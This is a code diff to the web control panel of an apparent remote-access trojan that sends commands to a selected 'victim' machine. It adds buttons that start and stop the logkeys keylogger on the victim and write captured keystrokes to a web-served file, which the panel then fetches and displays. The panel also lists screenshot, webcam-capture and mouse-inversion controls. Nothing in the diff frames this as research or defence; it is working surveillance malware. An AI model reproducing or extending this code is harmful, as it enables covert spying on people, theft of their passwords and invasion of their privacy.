@@ -92,8 +92,23 @@
 
 
 
+//keylog
 
-
+    $("#keylogview").on('click', function() { 
+            $.get("http://" + ips[$("#victim").val()] + "/keys.txt", function(data, status){
+                $("#lg-op-body").html(data);
+                $("#lg-op").modal('show');
+            });
+      });
+    $("#keylogstart").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'logkeys --start --output /var/www/html/keys.txt' }, function (data) {});   
+          alert("Keylogging started");
+    });
+    $("#keylogstop").on('click', function() { 
+          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'logkeys --kill' }, function (data) {});  
+          alert("Keylogging stopped"); 
+    });
+    
 
     $("#keypressinv").on('click', function() { 
           socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'xmodmap -e "pointer = 3 2 1"' }, function (data) {});   
@@ -112,12 +127,7 @@
           });
       });
 
-    $("#keylog").on('click', function() { 
-            $.get("http://" + ips[$("#victim").val()] + "/keys.txt", function(data, status){
-                $("#lg-op-body").html(data);
-                $("#lg-op").modal('show');
-            });
-      });
+    
 
     $("#screen").on('click', function() { 
             var random = Math.floor(Math.random() * 1000000) + 1;
@@ -271,7 +281,10 @@
       <h3>Telemetry.</h3>
         <button id="screen">Screenshot</button> <br/> <br/> 
         <button id="pic">Webcam Capture</button> <br/> <br/> 
-        <button id="keylog">View Keylogger Logs</button> <br/> <br/> 
+
+        <button id="keylogstart">Start Keylogger</button> <br/>
+        <button id="keylogstop">Stop Keylogger</button> <br/> 
+        <button id="keylogview">View Keylogger Logs</button> <br/> <br/> 
         
         <button id="keypressinv">Invert Mouse clicks</button> <br/> <br/> 
         <button id="keypressok">Default Mouse clicks</button> <br/> <br/> 
